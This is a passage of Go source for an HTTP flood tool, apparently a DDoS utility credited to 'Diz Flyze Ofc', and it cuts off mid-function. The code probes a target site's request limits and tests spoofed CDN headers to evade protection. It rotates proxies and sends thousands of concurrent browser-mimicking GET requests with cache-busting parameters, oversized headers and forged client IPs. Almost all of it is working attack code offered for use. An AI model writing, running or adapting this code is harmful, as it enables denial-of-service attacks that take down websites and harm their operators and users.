package main

import (
	"bufio"
	"context"
	"crypto/tls"
	"fmt"
	"io"
	"math/rand"
	"net"
	"net/http"
	"net/url"
	"os"
	"os/exec"
	"os/signal"
	"runtime"
	"strconv"
	"strings"
	"sync"
	"syscall"
	"time"
)

const (
	HAPUS          = "\033[0m"
	MERAH          = "\033[31m"
	IJO            = "\033[32m"
	PUTIH          = "\033[37m"
	CANDY          = "\033[91m"
	PUCAT          = "\033[38;5;203m"
	PUNYAMU        = "\033[38;5;204m"
	PUNYA_LU_PUCAT = "\033[38;5;218m"
	MASA_DEPAN_NYA = "\033[97m"
	Speed          = 7500
	to             = 6 * time.Second
	KEP            = 30 * time.Second
)

type BPF struct {
	UA           string
	Accept       string
	Lang         string
	Encoding     string
	SecChUa      string
	SecChUaMov   string
	SecChUaPlat  string
	SecFetchSite string
	SecFetchMode string
	SecFetchDest string
	Referer      string
	Origin       string
	DNT          string
}

var PFS = []BPF{
	{
		UA:           "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36",
		Accept:       "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
		Lang:         "en-US,en;q=0.9",
		Encoding:     "gzip, deflate, br",
		SecChUa:      `"Chromium";v="144", "Google Chrome";v="144", "Not?A_Brand";v="99"`,
		SecChUaMov:   "?0",
		SecChUaPlat:  "Windows",
		SecFetchSite: "none",
		SecFetchMode: "navigate",
		SecFetchDest: "document",
		Referer:      "https://www.google.com/search?q=",
		Origin:       "https://www.google.com",
		DNT:          "",
	},
	{
		UA:           "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36",
		Accept:       "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
		Lang:         "en-US,en;q=0.9",
		Encoding:     "gzip, deflate, br",
		SecChUa:      `"Chromium";v="143", "Google Chrome";v="143", "Not?A_Brand";v="99"`,
		SecChUaMov:   "?0",
		SecChUaPlat:  "macOS",
		SecFetchSite: "none",
		SecFetchMode: "navigate",
		SecFetchDest: "document",
		Referer:      "https://www.google.com/search?q=",
		Origin:       "https://www.google.com",
		DNT:          "",
	},
	{
		UA:           "Mozilla/5.0 (Linux; Android 15; SM-S928B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Mobile Safari/537.36",
		Accept:       "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
		Lang:         "en-US,en;q=0.9",
		Encoding:     "gzip, deflate, br",
		SecChUa:      `"Chromium";v="146", "Google Chrome";v="146", "Not?A_Brand";v="99"`,
		SecChUaMov:   "?1",
		SecChUaPlat:  "Android",
		SecFetchSite: "none",
		SecFetchMode: "navigate",
		SecFetchDest: "document",
		Referer:      "https://www.google.com/search?q=",
		Origin:       "https://www.google.com",
		DNT:          "",
	},
	{
		UA:           "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:135.0) Gecko/20100101 Firefox/135.0",
		Accept:       "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
		Lang:         "en-US,en;q=0.9",
		Encoding:     "gzip, deflate, br",
		SecChUa:      "",
		SecChUaMov:   "",
		SecChUaPlat:  "",
		SecFetchSite: "none",
		SecFetchMode: "navigate",
		SecFetchDest: "document",
		Referer:      "https://www.google.com/search?q=",
		Origin:       "",
		DNT:          "1",
	},
	{
		UA:           "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:137.0) Gecko/20100101 Firefox/137.0",
		Accept:       "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
		Lang:         "en-US,en;q=0.9",
		Encoding:     "gzip, deflate, br",
		SecChUa:      "",
		SecChUaMov:   "",
		SecChUaPlat:  "",
		SecFetchSite: "none",
		SecFetchMode: "navigate",
		SecFetchDest: "document",
		Referer:      "https://www.google.com/search?q=",
		Origin:       "",
		DNT:          "1",
	},
	{
		UA:           "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36 Edg/145.0.0.0",
		Accept:       "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
		Lang:         "en-US,en;q=0.9",
		Encoding:     "gzip, deflate, br",
		SecChUa:      `"Chromium";v="145", "Microsoft Edge";v="145", "Not?A_Brand";v="99"`,
		SecChUaMov:   "?0",
		SecChUaPlat:  "Windows",
		SecFetchSite: "none",
		SecFetchMode: "navigate",
		SecFetchDest: "document",
		Referer:      "https://www.bing.com/search?q=",
		Origin:       "https://www.bing.com",
		DNT:          "",
	},
	{
		UA:           "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36 OPR/130.0.0.0",
		Accept:       "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
		Lang:         "en-US,en;q=0.9",
		Encoding:     "gzip, deflate, br",
		SecChUa:      `"Chromium";v="144", "Opera";v="130", "Not?A_Brand";v="99"`,
		SecChUaMov:   "?0",
		SecChUaPlat:  "Windows",
		SecFetchSite: "none",
		SecFetchMode: "navigate",
		SecFetchDest: "document",
		Referer:      "https://www.google.com/search?q=",
		Origin:       "https://www.google.com",
		DNT:          "",
	},
	{
		UA:           "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.2 Safari/605.1.15",
		Accept:       "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8",
		Lang:         "en-US,en;q=0.9",
		Encoding:     "gzip, deflate, br",
		SecChUa:      "",
		SecChUaMov:   "",
		SecChUaPlat:  "",
		SecFetchSite: "none",
		SecFetchMode: "navigate",
		SecFetchDest: "document",
		Referer:      "https://www.google.com/search?q=",
		Origin:       "",
		DNT:          "",
	},
	{
		UA:           "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",
		Accept:       "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8",
		Lang:         "en-US,en;q=0.9",
		Encoding:     "gzip, deflate, br",
		SecChUa:      "",
		SecChUaMov:   "",
		SecChUaPlat:  "",
		SecFetchSite: "none",
		SecFetchMode: "navigate",
		SecFetchDest: "document",
		Referer:      "https://www.google.com/search?q=",
		Origin:       "",
		DNT:          "",
	},
}

var CBP = []string{"_", "cb", "rnd", "ts", "cache", "v", "ver", "t", "q", "s", "page", "id", "rand", "random"}
var COOKIES = []string{"session", "__cfduid", "_ga", "_gid", "visitor", "token", "cf_clearance", "__cf_bm"}
var REF = []string{
	"https://www.google.com/search?q=",
	"https://www.bing.com/search?q=",
	"https://www.yahoo.com/search?p=",
	"https://www.duckduckgo.com/?q=",
}

type CLI struct {
	client *http.Client
	ip     string
}

func init() {
	runtime.GOMAXPROCS(runtime.NumCPU())
}

func RIP(rng *rand.Rand) string {
	return fmt.Sprintf("%d.%d.%d.%d", rng.Intn(256), rng.Intn(256), rng.Intn(256), rng.Intn(256))
}

func RST(rng *rand.Rand, length int) string {
	const chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
	b := make([]byte, length)
	for i := range b {
		b[i] = chars[rng.Intn(len(chars))]
	}
	return string(b)
}

var ifModifiedSince = time.Now().AddDate(-1, 0, 0).Format(time.RFC1123)

func createTransport(host string, useCustomResolver bool) *http.Transport {
	var dialer *net.Dialer
	if useCustomResolver {
		resolver := &net.Resolver{
			PreferGo: true,
			Dial: func(ctx context.Context, network, address string) (net.Conn, error) {
				d := net.Dialer{Timeout: 3 * time.Second}
				return d.DialContext(ctx, "udp", "8.8.8.8:53")
			},
		}
		dialer = &net.Dialer{
			Timeout:   3 * time.Second,
			KeepAlive: KEP,
			Resolver:  resolver,
		}
	} else {
		dialer = &net.Dialer{
			Timeout:   3 * time.Second,
			KeepAlive: KEP,
		}
	}
	return &http.Transport{
		DialContext: dialer.DialContext,
		DisableKeepAlives:     false,
		DisableCompression:    true,
		MaxIdleConns:          20000,
		MaxIdleConnsPerHost:   10000,
		MaxConnsPerHost:       0,
		IdleConnTimeout:       KEP,
		WriteBufferSize:       32 << 10,
		ReadBufferSize:        32 << 10,
		TLSClientConfig: &tls.Config{
			InsecureSkipVerify: true,
			ServerName:         host,
			MinVersion:         tls.VersionTLS12,
			MaxVersion:         tls.VersionTLS13,
			NextProtos:         []string{"h2", "http/1.1"},
			Renegotiation:      tls.RenegotiateFreelyAsClient,
			CipherSuites: []uint16{
				tls.TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256,
				tls.TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256,
				tls.TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384,
				tls.TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384,
			},
		},
		ForceAttemptHTTP2:     true,
		TLSHandshakeTimeout:   3 * time.Second,
		ResponseHeaderTimeout: 3 * time.Second,
		ExpectContinueTimeout: 0 * time.Second,
	}
}

func PMP(target string, tr *http.Transport) int {
	client := &http.Client{
		Timeout:   5 * time.Second,
		Transport: tr,
	}
	sizes := []int{64, 128, 256, 512, 1024, 2048, 4096, 8192}
	Berhasil := 0
	for _, size := range sizes {
		testURL := target
		if strings.Contains(testURL, "?") {
			testURL += "&big=" + strings.Repeat("x", size)
		} else {
			testURL += "?big=" + strings.Repeat("x", size)
		}
		req, _ := http.NewRequest("GET", testURL, nil)
		req.Header.Set("User-Agent", "Mozilla/5.0")
		resp, err := client.Do(req)
		if err != nil {
			break
		}
		io.Copy(io.Discard, resp.Body)
		resp.Body.Close()
		if resp.StatusCode == http.StatusOK || resp.StatusCode == http.StatusFound || resp.StatusCode == http.StatusMovedPermanently {
			Berhasil = size
		} else if resp.StatusCode == http.StatusBadRequest || resp.StatusCode == http.StatusRequestURITooLong || resp.StatusCode == 413 {
			break
		} else {
			break
		}
	}
	return Berhasil
}

func PMH(target string, tr *http.Transport) int {
	client := &http.Client{
		Timeout:   5 * time.Second,
		Transport: tr,
	}
	sizes := []int{512, 1024, 2048, 4096, 8192, 16384}
	Berhasil := 0
	for _, size := range sizes {
		req, _ := http.NewRequest("GET", target, nil)
		req.Header.Set("User-Agent", "Mozilla/5.0")
		req.Header.Set("X-Large-Data", strings.Repeat("x", size))
		resp, err := client.Do(req)
		if err != nil {
			break
		}
		io.Copy(io.Discard, resp.Body)
		resp.Body.Close()
		if resp.StatusCode == http.StatusOK || resp.StatusCode == http.StatusFound || resp.StatusCode == http.StatusMovedPermanently {
			Berhasil = size
		} else if resp.StatusCode == http.StatusBadRequest || resp.StatusCode == 413 || resp.StatusCode == 431 {
			break
		} else {
			break
		}
	}
	return Berhasil
}

func PHR(target string, ProxyX string, tr *http.Transport) map[string]bool {
	client := &http.Client{
		Timeout:   5 * time.Second,
		Transport: tr,
	}
	parsedTarget, _ := url.Parse(target)
	targetHost := parsedTarget.Hostname()
	if ProxyX == "" {
		rng := rand.New(rand.NewSource(time.Now().UnixNano()))
		ProxyX = fmt.Sprintf("%d.%d.%d.%d", rng.Intn(256), rng.Intn(256), rng.Intn(256), rng.Intn(256))
	}
	HeadersBypas := []string{
		"X-Original-URL",
		"X-Forwarded-Host",
		"X-Request-ID",
		"CDN-Loop",
		"CF-Connecting-IP",
		"True-Client-IP",
	}
	result := make(map[string]bool)
	for _, h := range HeadersBypas {
		req, _ := http.NewRequest("GET", target, nil)
		req.Header.Set("User-Agent", "Mozilla/5.0")
		switch h {
		case "X-Original-URL":
			req.Header.Set("X-Original-URL", "/"+RST(rand.New(rand.NewSource(time.Now().UnixNano())), 8))
		case "X-Forwarded-Host":
			req.Header.Set("X-Forwarded-Host", targetHost)
		case "X-Request-ID":
			req.Header.Set("X-Request-ID", strconv.FormatInt(rand.Int63(), 16))
		case "CDN-Loop":
			req.Header.Set("CDN-Loop", "cloudflare")
		case "CF-Connecting-IP":
			req.Header.Set("CF-Connecting-IP", ProxyX)
		case "True-Client-IP":
			req.Header.Set("True-Client-IP", ProxyX)
		}
		resp, err := client.Do(req)
		if err != nil {
			result[h] = false
			continue
		}
		io.Copy(io.Discard, resp.Body)
		resp.Body.Close()
		if resp.StatusCode == http.StatusOK || resp.StatusCode == http.StatusFound || resp.StatusCode == http.StatusMovedPermanently {
			result[h] = true
		} else {
			result[h] = false
		}
	}
	return result
}

func HSUPPORT(target string) string {
	parsed, _ := url.Parse(target)
	host := parsed.Hostname()
	port := "443"
	conn, err := tls.Dial("tcp", net.JoinHostPort(host, port), &tls.Config{
		InsecureSkipVerify: true,
		NextProtos:         []string{"h2", "http/1.1"},
	})
	if err != nil {
		return "unknown"
	}
	defer conn.Close()
	proto := conn.ConnectionState().NegotiatedProtocol
	if proto == "h2" {
		return "H2"
	} else if proto == "http/1.1" {
		return "H1"
	}
	return "H3"
}

func ORIGIN(target string, tr *http.Transport) []string {
	client := &http.Client{
		Timeout:   5 * time.Second,
		Transport: tr,
	}
	parsed, _ := url.Parse(target)
	host := parsed.Hostname()
	candidates := []string{
		"https://" + host,
		"https://www.google.com",
		"https://www.bing.com",
		"https://www.yahoo.com",
		"",
	}
	var valid []string
	for _, origin := range candidates {
		req, _ := http.NewRequest("GET", target, nil)
		req.Header.Set("User-Agent", "Mozilla/5.0")
		if origin != "" {
			req.Header.Set("Origin", origin)
		}
		resp, err := client.Do(req)
		if err != nil {
			continue
		}
		io.Copy(io.Discard, resp.Body)
		resp.Body.Close()
		if resp.StatusCode >= 200 && resp.StatusCode < 400 {
			valid = append(valid, origin)
		}
	}
	if len(valid) == 0 {
		valid = append(valid, "https://"+host)
	}
	return valid
}

func UA_TEST(target string, tr *http.Transport) []string {
	client := &http.Client{
		Timeout:   5 * time.Second,
		Transport: tr,
	}
	testUAs := []string{
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36",
		"Mozilla/5.0 (Linux; Android 15; SM-S928B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Mobile Safari/537.36",
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:135.0) Gecko/20100101 Firefox/135.0",
		"Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",
	}
	var valid []string
	for _, ua := range testUAs {
		req, _ := http.NewRequest("GET", target, nil)
		req.Header.Set("User-Agent", ua)
		resp, err := client.Do(req)
		if err != nil {
			continue
		}
		io.Copy(io.Discard, resp.Body)
		resp.Body.Close()
		if resp.StatusCode >= 200 && resp.StatusCode < 400 {
			valid = append(valid, ua)
		}
	}
	if len(valid) == 0 {
		valid = append(valid, testUAs[0])
	}
	return valid
}

func REFFERER(target string, tr *http.Transport) []string {
	client := &http.Client{
		Timeout:   5 * time.Second,
		Transport: tr,
	}
	parsed, _ := url.Parse(target)
	host := parsed.Hostname()
	testReferers := []string{
		"https://" + host + "/",
		"https://www.google.com/search?q=" + host,
		"https://www.bing.com/search?q=" + host,
		"https://www.yahoo.com/search?p=" + host,
		"",
	}
	var valid []string
	for _, ref := range testReferers {
		req, _ := http.NewRequest("GET", target, nil)
		req.Header.Set("User-Agent", "Mozilla/5.0")
		if ref != "" {
			req.Header.Set("Referer", ref)
		}
		resp, err := client.Do(req)
		if err != nil {
			continue
		}
		io.Copy(io.Discard, resp.Body)
		resp.Body.Close()
		if resp.StatusCode >= 200 && resp.StatusCode < 400 {
			valid = append(valid, ref)
		}
	}
	if len(valid) == 0 {
		valid = append(valid, "https://"+host+"/")
	}
	return valid
}

func ENCOD(target string, tr *http.Transport) []string {
	client := &http.Client{
		Timeout:   5 * time.Second,
		Transport: tr,
	}
	encodings := []string{"gzip, deflate, br", "gzip, deflate", "gzip", "br", "identity"}
	var valid []string
	for _, enc := range encodings {
		req, _ := http.NewRequest("GET", target, nil)
		req.Header.Set("User-Agent", "Mozilla/5.0")
		req.Header.Set("Accept-Encoding", enc)
		resp, err := client.Do(req)
		if err != nil {
			continue
		}
		io.Copy(io.Discard, resp.Body)
		resp.Body.Close()
		if resp.StatusCode >= 200 && resp.StatusCode < 400 {
			valid = append(valid, enc)
		}
	}
	if len(valid) == 0 {
		valid = append(valid, "gzip, deflate, br")
	}
	return valid
}

func CACH(target string, tr *http.Transport) []string {
	client := &http.Client{
		Timeout:   5 * time.Second,
		Transport: tr,
	}
	controls := []string{"no-cache", "no-store", "max-age=0", "must-revalidate"}
	var valid []string
	for _, cc := range controls {
		req, _ := http.NewRequest("GET", target, nil)
		req.Header.Set("User-Agent", "Mozilla/5.0")
		req.Header.Set("Cache-Control", cc)
		resp, err := client.Do(req)
		if err != nil {
			continue
		}
		io.Copy(io.Discard, resp.Body)
		resp.Body.Close()
		if resp.StatusCode >= 200 && resp.StatusCode < 400 {
			valid = append(valid, cc)
		}
	}
	if len(valid) == 0 {
		valid = append(valid, "no-cache")
	}
	return valid
}

type ORPL struct {
	Origin       string
	Referer      string
	SecFetchSite string
}

func GPFO(origin string, host string) ORPL {
	switch origin {
	case "https://" + host:
		return ORPL{
			Origin:       origin,
			Referer:      "https://" + host + "/",
			SecFetchSite: "same-origin",
		}
	case "https://www.google.com":
		return ORPL{
			Origin:       origin,
			Referer:      "https://www.google.com/search?q=" + host,
			SecFetchSite: "cross-site",
		}
	case "https://www.bing.com":
		return ORPL{
			Origin:       origin,
			Referer:      "https://www.bing.com/search?q=" + host,
			SecFetchSite: "cross-site",
		}
	case "https://www.yahoo.com":
		return ORPL{
			Origin:       origin,
			Referer:      "https://www.yahoo.com/search?p=" + host,
			SecFetchSite: "cross-site",
		}
	default:
		return ORPL{
			Origin:       "",
			Referer:      "",
			SecFetchSite: "cross-site",
		}
	}
}

func loadProxyFromFile() []*url.URL {
	var PRX []*url.URL
	file, err := os.Open("proxy.txt")
	if err != nil {
		return PRX
	}
	defer file.Close()
	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		line := strings.TrimSpace(scanner.Text())
		if line == "" {
			continue
		}
		if !strings.HasPrefix(line, "http://") && !strings.HasPrefix(line, "https://") {
			line = "http://" + line
		}
		if p, err := url.Parse(line); err == nil {
			PRX = append(PRX, p)
		}
	}
	return PRX
}

func runAttack(tgt string, dur int, cookie string) {
	parsed, _ := url.Parse(tgt)
	host := parsed.Hostname()
	if strings.HasPrefix(host, "www.") {
		host = host[4:]
	}
	useCustom := false
	ctxDNS, cancelDNS := context.WithTimeout(context.Background(), 2*time.Second)
	defer cancelDNS()
	addrs, err := net.DefaultResolver.LookupHost(ctxDNS, host)
	if err != nil || len(addrs) == 0 {
		useCustom = true
	}
	probeTransport := createTransport(host, useCustom)
	attackTransport := createTransport(host, useCustom)

	PRX := loadProxyFromFile()
	if len(PRX) == 0 {
		PRX = append(PRX, nil)
	}

	var ProxyX string
	var proxyIPs []string
	for _, p := range PRX {
		if p != nil {
			proxyIPs = append(proxyIPs, p.Hostname())
		}
	}
	if len(proxyIPs) > 0 {
		ProxyX = proxyIPs[0]
	}
	ipPool := proxyIPs
	if len(ipPool) == 0 {
		ipPool = []string{"127.0.0.1", "8.8.8.8", "1.1.1.1", "192.168.1.1", "10.0.0.1"}
	}
	fmt.Println("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
	var (
		MaxP      int
		MaxHead   int
		Supported map[string]bool
		HVERSI    string
		VORI      []string
		VUAS      []string
		VREF      []string
		VENC      []string
		VCAC      []string
	)
	var wg sync.WaitGroup
	wg.Add(9)
	var probeDone int
	var probeMu sync.Mutex
	printProbe := func(name string) {
		probeMu.Lock()
		probeDone++
		done := probeDone
		probeMu.Unlock()
		fmt.Printf("[ Bypassed ] ▶ [ %-10s ] ▶ [ %d%% ]\n", name, (done*100)/9)
	}
	go func() {
		defer wg.Done()
		MaxP = PMP(tgt, probeTransport)
		printProbe("PMP")
	}()
	go func() {
		defer wg.Done()
		MaxHead = PMH(tgt, probeTransport)
		printProbe("PMH")
	}()
	go func() {
		defer wg.Done()
		Supported = PHR(tgt, ProxyX, probeTransport)
		printProbe("PHR")
	}()
	go func() {
		defer wg.Done()
		HVERSI = HSUPPORT(tgt)
		printProbe("HSP")
	}()
	go func() {
		defer wg.Done()
		VORI = ORIGIN(tgt, probeTransport)
		printProbe("ORIGIN")
	}()
	go func() {
		defer wg.Done()
		VUAS = UA_TEST(tgt, probeTransport)
		printProbe("UA")
	}()
	go func() {
		defer wg.Done()
		VREF = REFFERER(tgt, probeTransport)
		printProbe("REFFERER")
	}()
	go func() {
		defer wg.Done()
		VENC = ENCOD(tgt, probeTransport)
		printProbe("ENCOD")
	}()
	go func() {
		defer wg.Done()
		VCAC = CACH(tgt, probeTransport)
		printProbe("CACHE")
	}()
	wg.Wait()
	fmt.Println("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n")

	wcs := make([]CLI, len(PRX))
	for i, ProxyY := range PRX {
		tr := attackTransport
		if ProxyY != nil {
			tr2 := tr.Clone()
			tr2.Proxy = http.ProxyURL(ProxyY)
			tr = tr2
		}
		ip := ""
		if ProxyY != nil {
			ip = ProxyY.Hostname()
		}
		client := &http.Client{
			Transport: tr,
			Timeout:   to,
		}
		wcs[i] = CLI{client: client, ip: ip}
	}
	fmt.Printf("%s", MASA_DEPAN_NYA)
	fmt.Println("\n:::::::-.  :::::::::      .,~:::::    .:::.")
	fmt.Printf("%s", PUNYA_LU_PUCAT)
	fmt.Println(" ;;,   `';,'`````;;;    ,;;;'````'   ,;'``;.")
	fmt.Printf("%s", PUNYAMU)
	fmt.Println(" `[[     [[    .n[['    [[[          ''  ,['")
	fmt.Printf("%s", PUCAT)
	fmt.Println("  $$,    $$  ,$$P\" cccc $$$          .c$$P'")
	fmt.Printf("%s", MERAH)
	fmt.Println("  888_,o8P',888bo,_     `88bo,__,o, d88 _,oo,")
	fmt.Printf("%s", CANDY)
	fmt.Println("  MMMMP\"`   `\"\"*UMM       \"YUMMMMMP\"MMMUP*\"^^")
	fmt.Printf("%s", HAPUS)
	fmt.Printf("%s━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━%s\n", MERAH, HAPUS)
	printInfo := func(label, value, status string) {
		if status != "" {
			fmt.Printf("%s〇%s %s%s%s %s:%s %s%s%s %s[%s%s%s]\n",
				IJO, HAPUS,
				PUTIH, label, HAPUS,
				MERAH, HAPUS,
				PUTIH, value, HAPUS,
				MERAH, IJO, status, MERAH,
			)
		} else {
			fmt.Printf("%s〇%s %s%s%s %s:%s %s%s%s\n",
				IJO, HAPUS,
				PUTIH, label, HAPUS,
				MERAH, HAPUS,
				PUTIH, value, HAPUS)
		}
	}
	printInfo("Author", "Diz Flyze Ofc              ", "True")
	printInfo("Target", host, "")
	printInfo("Port  ", "443                        ", "True")
	printInfo("Method", "GET                       ", "True")
	printInfo("Proxy ", fmt.Sprintf("%d                        ", len(PRX)), "True")
	printInfo("Worker", fmt.Sprintf("%d                       ", Speed), "True")
	printInfo("HTTP  ", fmt.Sprintf("%-24s   ", HVERSI), "True")
	if cookie != "" {
		fmt.Printf("%s〇%s %sCookie%s %s:%s %s                            [%s%s%s]\n",
			IJO, HAPUS,
			PUTIH, HAPUS,
			MERAH, HAPUS,
			MERAH, IJO, "True", MERAH)
	} else {
		fmt.Printf("%s〇%s %sCookie%s %s:%s %s                            [%s%s%s]\n",
			IJO, HAPUS,
			PUTIH, HAPUS,
			MERAH, HAPUS,
			PUTIH, IJO, "None", PUTIH)
	}
	fmt.Printf("%s━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━%s\n", MERAH, HAPUS)
	Start_Main := time.Now()
	ctx, cancel := context.WithCancel(context.Background())
	go func() {
		ticker := time.NewTicker(1 * time.Second)
		defer ticker.Stop()
		for {
			select {
			case <-ctx.Done():
				fmt.Printf("\r%*s\r", 80, "")
				return
			case <-ticker.C:
				elapsed := int(time.Since(Start_Main).Seconds())
				remaining := dur - elapsed
				if remaining < 0 {
					remaining = 0
				}
				fmt.Printf("\r%s〇%s %sTime  %s %s:%s %s%02d/%ds%s                    %s[%s%s%s]\033[K",
					IJO, HAPUS,
					PUTIH, HAPUS,
					MERAH, HAPUS,
					PUTIH, elapsed, dur, HAPUS,
					MERAH, IJO, "True", MERAH)
			}
		}
	}()
	var wg2 sync.WaitGroup
	time.AfterFunc(time.Duration(dur)*time.Second, func() {
		cancel()
	})
	type headerItem struct {
		key, value string
	}
	for i := 0; i < Speed; i++ {
		wg2.Add(1)
		c := wcs[i%len(wcs)]
		go func(cli CLI, workerID int) {
			defer wg2.Done()
			rng := rand.New(rand.NewSource(time.Now().UnixNano() + int64(workerID)))
			for ctx.Err() == nil {
				method := "GET"
				ua := VUAS[rng.Intn(len(VUAS))]
				ref := VREF[rng.Intn(len(VREF))]
				enc := VENC[rng.Intn(len(VENC))]
				cacheCtrl := VCAC[rng.Intn(len(VCAC))]
				FORIP := ipPool[rng.Intn(len(ipPool))]
				realIP := cli.ip
				if realIP == "" {
					realIP = FORIP
				}
				SLOR := VORI[rng.Intn(len(VORI))]
				OPRF := GPFO(SLOR, host)
				prof := PFS[rng.Intn(len(PFS))]
				params := []string{}
				for j := 0; j < 2+rng.Intn(2); j++ {
					key := CBP[rng.Intn(len(CBP))]
					val := strconv.FormatInt(rng.Int63(), 10)
					params = append(params, key+"="+val)
				}
				var targetURL string
				if strings.Contains(tgt, "?") {
					targetURL = tgt + "&" + strings.Join(params, "&")
				} else {
					targetURL = tgt + "?" + strings.Join(params, "&")
				}
				if MaxP > 0 && rng.Intn(3) == 0 {
					size := MaxP/2 + rng.Intn(MaxP/2)
					if size < 1 {
						size = 64
					}
					targetURL += "&big=" + strings.Repeat("x", size)
				}
				if rng.Intn(10) == 0 {
					targetURL += "&" + RST(rng, 8) + "=" + RST(rng, 12)
				}
				var body io.Reader = nil
				req, _ := http.NewRequest(method, targetURL, body)
				headers := []headerItem{}

				headers = append(headers, headerItem{"User-Agent", ua})
				headers = append(headers, headerItem{"Accept", prof.Accept})
				headers = append(headers, headerItem{"Accept-Encoding", enc})
				headers = append(headers, headerItem{"Cache-Control", cacheCtrl})
				headers = append(headers, headerItem{"Connection", "keep-alive"})
				headers = append(headers, headerItem{"Upgrade-Insecure-Requests", "1"})

				if prof.Lang != "" {
					headers = append(headers, headerItem{"Accept-Language", prof.Lang})
				}

				if OPRF.Origin != "" && OPRF.Referer != "" {
					headers = append(headers, headerItem{"Referer", OPRF.Referer})
					headers = append(headers, headerItem{"Origin", OPRF.Origin})
				} else if ref != "" {
					headers = append(headers, headerItem{"Referer", ref})
				}

				headers = append(headers, headerItem{"Sec-Fetch-Site", OPRF.SecFetchSite})
				headers = append(headers, headerItem{"Sec-Fetch-Mode", prof.SecFetchMode})
				headers = append(headers, headerItem{"Sec-Fetch-Dest", prof.SecFetchDest})

				if prof.SecChUa != "" {
					headers = append(headers, headerItem{"Sec-Ch-Ua", prof.SecChUa})
					headers = append(headers, headerItem{"Sec-Ch-Ua-Mobile", prof.SecChUaMov})
					headers = append(headers, headerItem{"Sec-Ch-Ua-Platform", prof.SecChUaPlat})
				}
				if prof.DNT != "" {
					headers = append(headers, headerItem{"DNT", prof.DNT})
				}

				if rng.Intn(3) == 0 {
					headers = append(headers, headerItem{"If-Modified-Since", ifModifiedSince})
				}
				if rng.Intn(4) == 0 {
					headers = append(headers, headerItem{"If-None-Match", `"` + RST(rng, 16) + `"`})
				}
				if rng.Intn(5) == 0 {
					headers = append(headers, headerItem{"Range", "bytes=0-"})
				}
				if rng.Intn(3) == 0 {
					headers = append(headers, headerItem{"Pragma", "no-cache"})
				}

				if Supported["X-Original-URL"] && rng.Intn(3) == 0 {
					headers = append(headers, headerItem{"X-Original-URL", "/" + strconv.FormatInt(rng.Int63(), 16)})
				}
				if Supported["X-Forwarded-Host"] && rng.Intn(3) == 0 {
					headers = append(headers, headerItem{"X-Forwarded-Host", strconv.FormatInt(rng.Int63(), 16) + "t.me/ytdizflyze"})
				}
				if Supported["X-Request-ID"] && rng.Intn(3) == 0 {
					headers = append(headers, headerItem{"X-Request-ID", strconv.FormatInt(rng.Int63(), 16)})
				}
				if Supported["CF-Connecting-IP"] && rng.Intn(5) == 0 {
					headers = append(headers, headerItem{"CF-Connecting-IP", realIP})
				}
				if Supported["True-Client-IP"] && rng.Intn(5) == 0 {
					headers = append(headers, headerItem{"True-Client-IP", realIP})
				}
				if Supported["CDN-Loop"] && rng.Intn(5) == 0 {
					headers = append(headers, headerItem{"CDN-Loop", "cloudflare"})
				}

				headers = append(headers, headerItem{"X-Forwarded-For", realIP})
				if rng.Intn(5) == 0 {
					headers = append(headers, headerItem{"X-Real-IP", realIP})
				}

				if MaxHead > 0 && rng.Intn(2) == 0 {
					size := MaxHead/2 + rng.Intn(MaxHead/2)
					if size < 1 {
						size = 512
					}
					headers = append(headers, headerItem{"X-Large-Data", strings.Repeat("x", size)})
				}

				var cookies []string
